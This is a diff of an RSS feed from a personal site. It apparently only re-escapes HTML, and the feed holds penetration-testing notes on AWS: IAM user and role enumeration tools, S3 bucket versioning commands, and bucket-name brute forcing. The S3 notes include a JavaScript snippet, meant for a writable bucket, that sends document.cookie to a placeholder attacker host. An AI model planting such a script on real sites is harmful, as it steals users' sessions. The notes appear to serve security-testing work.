@@ -1,34 +1,34 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AWS on Pete's Website</title><link>https://cipolone95.github.io/notes/cloud/aws/</link><description>Recent content in AWS on Pete's Website</description><generator>Hugo -- gohugo.io</generator><language>en</language><atom:link href="https://cipolone95.github.io/notes/cloud/aws/index.xml" rel="self" type="application/rss+xml"/><item><title>AWS Notes</title><link>https://cipolone95.github.io/notes/cloud/aws/files/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://cipolone95.github.io/notes/cloud/aws/files/</guid><description>&lt;div class="note-card ">
-&lt;div class="item">
-&lt;h5 class="note-title">&lt;span>IAM&lt;/span>&lt;/h5>
-&lt;div class="card">
-&lt;div class="card-body">&lt;p>Enumerate for valid users and rols in the AWS Account&lt;/p>
-&lt;ul>
-&lt;li>Tool URL: &lt;a href="https://github.com/dievus/AWeSomeUserFinder" target="_blank" rel="noopener">https://github.com/dievus/AWeSomeUserFinder&lt;/a>&lt;/li>
-&lt;li>Helpful Wordlists for Users and Roles
-&lt;ul>
-&lt;li>&lt;a href="https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__enum_users/default-word-list.txt" target="_blank" rel="noopener">https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__enum_users/default-word-list.txt&lt;/a>&lt;/li>
-&lt;li>&lt;a href="https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__enum_roles/default-word-list.txt" target="_blank" rel="noopener">https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__enum_roles/default-word-list.txt&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;/li>
-&lt;/ul>&lt;/div>
-&lt;/div>
-&lt;/div>
-&lt;/div>
-&lt;!-- Condition -->
-&lt;div class="note-card ">
-&lt;div class="item">
-&lt;h5 class="note-title">&lt;span>S3 Buckets&lt;/span>&lt;/h5>
-&lt;div class="card">
-&lt;div class="card-body">&lt;p>Check for Writable S3 Buckets&lt;/p>
-&lt;ul>
-&lt;li>If you can upload, then you can show impact by changing JS to steal cookies and other things.
-&lt;pre tabindex="0">&lt;code>var xhr=new XMLHttpRequest();
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AWS on Pete's Website</title><link>https://cipolone95.github.io/notes/cloud/aws/</link><description>Recent content in AWS on Pete's Website</description><generator>Hugo -- gohugo.io</generator><language>en</language><atom:link href="https://cipolone95.github.io/notes/cloud/aws/index.xml" rel="self" type="application/rss+xml"/><item><title>AWS Notes</title><link>https://cipolone95.github.io/notes/cloud/aws/files/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://cipolone95.github.io/notes/cloud/aws/files/</guid><description>&lt;div class="note-card "&gt;
+&lt;div class="item"&gt;
+&lt;h5 class="note-title"&gt;&lt;span&gt;IAM&lt;/span&gt;&lt;/h5&gt;
+&lt;div class="card"&gt;
+&lt;div class="card-body"&gt;&lt;p&gt;Enumerate for valid users and rols in the AWS Account&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Tool URL: &lt;a href="https://github.com/dievus/AWeSomeUserFinder" target="_blank" rel="noopener"&gt;https://github.com/dievus/AWeSomeUserFinder&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Helpful Wordlists for Users and Roles
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__enum_users/default-word-list.txt" target="_blank" rel="noopener"&gt;https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__enum_users/default-word-list.txt&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__enum_roles/default-word-list.txt" target="_blank" rel="noopener"&gt;https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__enum_roles/default-word-list.txt&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;!-- Condition --&gt;
+&lt;div class="note-card "&gt;
+&lt;div class="item"&gt;
+&lt;h5 class="note-title"&gt;&lt;span&gt;S3 Buckets&lt;/span&gt;&lt;/h5&gt;
+&lt;div class="card"&gt;
+&lt;div class="card-body"&gt;&lt;p&gt;Check for Writable S3 Buckets&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;If you can upload, then you can show impact by changing JS to steal cookies and other things.
+&lt;pre tabindex="0"&gt;&lt;code&gt;var xhr=new XMLHttpRequest();
 xhr.open(&amp;#34;GET&amp;#34;, &amp;#34;http://&amp;lt;IP&amp;gt;:8000/?&amp;#34;+document.cookie, true);
 xhr.send();
-&lt;/code>&lt;/pre>&lt;/li>
-&lt;/ul>
-&lt;p>Check for Bucket Versioning&lt;/p>
-&lt;pre tabindex="0">&lt;code>curl -I https://&amp;lt;BUCKETNAME&amp;gt;.s3.&amp;lt;REGION&amp;gt;.amazonaws.com //Look for x-amz-version-id
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Check for Bucket Versioning&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;curl -I https://&amp;lt;BUCKETNAME&amp;gt;.s3.&amp;lt;REGION&amp;gt;.amazonaws.com //Look for x-amz-version-id
 aws s3api list-object-versions --bucket &amp;lt;BUCKETNAME&amp;gt; --query &amp;#34;Versions[?VersionId!=&amp;#39;null&amp;#39;]&amp;#34; --no-sign-request
-&lt;/code>&lt;/pre>&lt;p>Brute Force Bucket Names (assuming patterns are found)&lt;/p></description></item></channel></rss>
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Brute Force Bucket Names (assuming patterns are found)&lt;/p&gt;</description></item></channel></rss>
